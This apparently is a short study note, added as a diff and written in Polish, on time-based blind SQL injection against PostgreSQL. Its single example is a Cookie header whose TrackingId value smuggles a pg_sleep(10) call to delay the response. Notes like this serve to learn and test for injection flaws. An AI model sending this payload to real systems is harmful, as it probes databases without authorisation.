@@ -1,0 +1,5 @@
+SleepInjection czyli dobre do sprawdzania blindsql :)
+
+
+[PRZYKLAD WSTRZYKNIECIA W COOKIE ODPOWIEDZ PO 10s] (baza postgreSQL)
+Cookie: TrackingId=on9AfmjAgHmWt5Ai'||pg_sleep(10)--; session=2iYIJe9sHvVmh7vDRzEmLyBN4x5Rqz6T
